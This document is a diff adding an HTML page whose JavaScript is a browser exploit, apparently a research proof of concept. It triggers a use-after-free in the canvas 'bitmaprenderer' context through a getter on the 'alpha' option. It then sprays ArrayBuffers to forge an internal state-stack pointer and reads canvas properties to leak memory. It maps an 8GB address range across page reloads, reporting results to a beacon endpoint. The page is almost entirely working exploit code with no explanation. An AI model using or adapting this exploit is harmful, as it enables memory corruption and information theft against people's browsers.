@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V657</title></head>
+<body><pre id="out">V657 — 8GB binary subdivision mapper</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%60];
+  img.src='/beacon/V657-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
+  _f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+/*
+ * 8GB BINARY SUBDIVISION
+ * ======================
+ * Range: 0x100000000 - 0x900000000 (8GB)
+ * Step unit: 128MB (0x8000000)
+ * Total slots: 64
+ *
+ * Binary subdivision ORDER (not linear!):
+ *   L0: slot 0, 32, 63          → 0x100000000, 0x500000000, 0x8F8000000
+ *   L1: slot 16, 48             → 0x300000000, 0x700000000
+ *   L2: slot 8, 24, 40, 56      → 0x200000000, 0x400000000, 0x600000000, 0x800000000
+ *   L3: 4,12,20,28,36,44,52,60  → 128MB midpoints
+ *   L4: odd-numbered slots       → 128MB fill
+ *   ...
+ *
+ * 9 probes = 8GB at 1GB resolution
+ * 17 probes = 8GB at 512MB resolution
+ * 33 probes = 8GB at 256MB resolution
+ * 64 probes = 8GB at 128MB resolution (FULL)
+ *
+ * On HIT: dense scan ±512MB around hit at 32MB steps (32 more probes)
+ */
+
+var RANGE_START_HI = 1;  // 0x100000000
+var RANGE_START_LO = 0;
+var STEP = 0x8000000;     // 128MB
+var SLOTS = 64;
+
+/* Generate binary subdivision order */
+function genOrder(n) {
+  var order = [];
+  order.push(0);
+  order.push(n >>> 1);
+  order.push(n - 1);
+  for (var level = 1; level <= 6; level++) {
+    var div = 1 << (level + 1);
+    var s = Math.floor(n / div);
+    if (s < 1) break;
+    for (var k = 0; k < (1 << level); k++) {
+      var idx = (2*k+1)*s;
+      if (idx >= 0 && idx < n && order.indexOf(idx) === -1) {
+        order.push(idx);
+      }
+    }
+  }
+  /* Fill any remaining */
+  for (var i = 0; i < n; i++) {
+    if (order.indexOf(i) === -1) order.push(i);
+  }
+  return order;
+}
+
+var slotOrder = genOrder(SLOTS);
+
+/* Build probe list: coarse first, then dense around hits */
+var PROBES = [];
+for (var i = 0; i < slotOrder.length; i++) {
+  var slot = slotOrder[i];
+  var totalOff = slot * STEP;
+  var hi = RANGE_START_HI;
+  var lo = RANGE_START_LO + totalOff;
+  while (lo >= 0x100000000) { lo -= 0x100000000; hi++; }
+  lo = lo >>> 0;
+  PROBES.push({hi:hi, lo:lo, slot:slot, phase:'C'});
+}
+
+var MAX_COARSE = PROBES.length;
+
+/* State */
+var idx = 0;
+try { idx = parseInt(localStorage.getItem('v657_idx')) || 0; } catch(e) {}
+var results = [];
+try { results = JSON.parse(localStorage.getItem('v657_res') || '[]'); } catch(e) { results = []; }
+
+/* Check if we have a HIT and need to do dense scan */
+var hitAddrs = [];
+for (var h = 0; h < results.length; h++) {
+  if (results[h].s === 'H') hitAddrs.push(results[h]);
+}
+
+/* If we got a coarse HIT and finished coarse, inject dense probes */
+if (hitAddrs.length > 0 && idx >= MAX_COARSE) {
+  var denseAdded = false;
+  try { denseAdded = localStorage.getItem('v657_dense') === '1'; } catch(e){}
+  if (!denseAdded) {
+    /* Dense scan: ±512MB around first HIT at 32MB steps */
+    var hitHi = hitAddrs[0].rhi;
+    var hitLo = hitAddrs[0].rlo;
+    if (hitHi !== undefined) {
+      for (var d = -16; d <= 16; d++) {
+        var dlo = hitLo + d * 0x2000000;
+        var dhi = hitHi;
+        while (dlo < 0) { dlo += 0x100000000; dhi--; }
+        while (dlo >= 0x100000000) { dlo -= 0x100000000; dhi++; }
+        dlo = dlo >>> 0;
+        /* Skip if already probed (check coarse results) */
+        var aH = '0x'+('00000000'+dhi.toString(16)).slice(-8)+('00000000'+dlo.toString(16)).slice(-8);
+        var dup = false;
+        for (var dd = 0; dd < results.length; dd++) { if (results[dd].a === aH) { dup = true; break; } }
+        if (!dup) {
+          PROBES.push({hi:dhi, lo:dlo, slot:-1, phase:'D'});
+        }
+      }
+      try { localStorage.setItem('v657_dense', '1'); } catch(e){}
+    }
+  }
+}
+
+var MAX = PROBES.length;
+var hits = results.filter(function(r){return r.s==='H';}).length;
+var misses = results.filter(function(r){return r.s==='M';}).length;
+
+bk('BOOT', 'i='+idx+'/'+MAX+'|hits='+hits+'|miss='+misses);
+say('Probe '+idx+'/'+MAX);
+say('Hits: '+hits+' / Misses: '+misses);
+
+if (idx >= MAX) {
+  var summary = results.map(function(r){return r.a+':'+r.s;}).join(',');
+  bk('DONE', 'total='+results.length+'|hits='+hits+'|'+summary.slice(0,800));
+  say('\n=== SCAN COMPLETE ===');
+  say('HITS:');
+  results.forEach(function(r){
+    if(r.s==='H') say('  '+r.a+' ['+r.p+'] '+r.d);
+  });
+} else {
+  var p = PROBES[idx];
+  var probeHi = p.hi;
+  var probeLo = p.lo;
+
+  var addrHex = '0x'+('00000000'+probeHi.toString(16)).slice(-8)+('00000000'+(probeLo>>>0).toString(16)).slice(-8);
+  bk('TGT', 'i='+idx+'|'+p.phase+(p.slot>=0?'-S'+p.slot:'')+'|'+addrHex);
+  say('-> '+addrHex+' ('+p.phase+(p.slot>=0?' slot '+p.slot:'')+')');
+
+  /* Pre-save as MISS */
+  results.push({a:addrHex, s:'M', p:p.phase, rhi:probeHi, rlo:probeLo});
+  try {
+    localStorage.setItem('v657_idx', String(idx + 1));
+    localStorage.setItem('v657_res', JSON.stringify(results));
+  } catch(e) {}
+
+  /* === UAF TRIGGER === */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+
+  if (!innerCtx) {
+    bk('FAIL', 'no-inner');
+    setTimeout(function(){location.reload();},2000);
+  } else {
+    for (var f = 0; f < 600; f++) new ArrayBuffer(16);
+
+    var abs = new Array(200);
+    var dvs = new Array(200);
+    for (var ss = 0; ss < 200; ss++) {
+      abs[ss] = new ArrayBuffer(768);
+      dvs[ss] = new DataView(abs[ss]);
+    }
+
+    /* Forge m_stateStack → target */
+    for (var w = 0; w < 200; w++) {
+      dvs[w].setUint32(112, probeLo>>>0, true);
+      dvs[w].setUint32(116, probeHi, true);
+      dvs[w].setUint32(120, 2, true);
+      dvs[w].setUint32(124, 1, true);
+    }
+
+    /* CRITICAL READ */
+    var lw = innerCtx.lineWidth;
+
+    /* ===== HIT ===== */
+    var lwB = f2big(lw);
+    bk('HIT', '***'+addrHex+'|'+p.phase+'|lw='+lwB+'***');
+    say('*** HIT *** '+addrHex+' lw='+lwB);
+
+    var ml=-1,ga=-1,sb=-1;
+    try{ml=innerCtx.miterLimit;}catch(e){ml=-888;}
+    try{ga=innerCtx.globalAlpha;}catch(e){ga=-888;}
+    try{sb=innerCtx.shadowBlur;}catch(e){sb=-888;}
+    var mlB=f2big(ml), gaB=f2big(ga), sbB=f2big(sb);
+
+    /* Re-forge +0x1000 */
+    var probeLo2 = (probeLo + 0x1000)>>>0;
+    var probeHi2 = probeHi + (probeLo + 0x1000 > 0xFFFFFFFF ? 1 : 0);
+    for (var w2 = 0; w2 < 200; w2++) {
+      dvs[w2].setUint32(112, probeLo2, true);
+      dvs[w2].setUint32(116, probeHi2, true);
+    }
+    var lw2=-1,ml2=-1;
+    try{lw2=innerCtx.lineWidth;}catch(e){lw2=-888;}
+    try{ml2=innerCtx.miterLimit;}catch(e){ml2=-888;}
+    var lw2B=f2big(lw2), ml2B=f2big(ml2);
+
+    var dataStr = 'lw='+lwB+'|ml='+mlB+'|ga='+gaB+'|sb='+sbB+'|lw+4K='+lw2B+'|ml+4K='+ml2B;
+    bk('DATA', addrHex+'|'+dataStr);
+    say('  '+dataStr);
+
+    results[results.length-1] = {a:addrHex, s:'H', p:p.phase, d:dataStr, rhi:probeHi, rlo:probeLo};
+    try { localStorage.setItem('v657_res', JSON.stringify(results)); } catch(e) {}
+
+    innerCtx = null;
+    for (var cc = 0; cc < 200; cc++) {
+      dvs[cc].setFloat64(112, 0, true);
+      dvs[cc].setUint32(120, 0, true);
+      dvs[cc].setUint32(124, 0, true);
+    }
+    canvas._abs = abs;
+  }
+
+  bk('NEXT', 'reload-2s');
+  setTimeout(function(){location.reload();}, 2000);
+}
+</script>
+</body></html>
